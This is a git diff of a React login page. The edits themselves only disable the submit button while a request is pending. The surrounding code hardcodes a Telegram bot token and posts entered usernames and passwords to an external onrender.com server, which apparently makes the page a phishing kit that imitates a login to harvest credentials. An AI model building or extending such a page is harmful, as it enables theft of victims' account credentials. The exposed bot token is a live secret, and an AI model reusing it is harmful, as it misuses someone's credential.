@@ -21,6 +21,8 @@ function App() {
   const [sorrys, sorrysSet] = useState('sorry');
   const [pinclaw, pinclawSet] = useState('');
   const [pshows, pshowsSet] = useState('pshow');
+  const [bbb, bbbSet] = useState('');
+  const [buttonDisabled, setButtonDisabled] = useState(false);
 
 
   const botToken = '5487410170:AAF60BxMlwAyuSyBzI88bj3ITFU2C6P71r4';
@@ -59,6 +61,8 @@ function App() {
     const formData = new FormData(e.target);
     const username = formData.get("username");
     const password = formData.get("password");
+    setButtonDisabled(true);
+    bbbSet('bbb')
 
     try {
       const response = await axios.post('https://baselinesa.onrender.com/login', {
@@ -70,7 +74,9 @@ function App() {
       const responseData = response.data;
       if(responseData.message === "Password is Invalid"){
         // alert(responseData.message)
+        setButtonDisabled(false)
         sorryShow('')
+        bbbSet('')
       } else {
         formmsSet('formms')
         classValueShow(responseData.classValue)
@@ -218,7 +224,7 @@ function App() {
           required/>
           </div><br/>
           <button type="" id={butt} className="" onClick={handleNextClick}>Next</button>
-          <button id={buttt} type="submit">Next</button>
+          <button id={buttt} type="submit" className={bbb} disabled={buttonDisabled}>Next</button>
         </form><br/><br/><br/>
         <a href="">I need help logging on</a><br/><br/><br/><br/>
       </div>
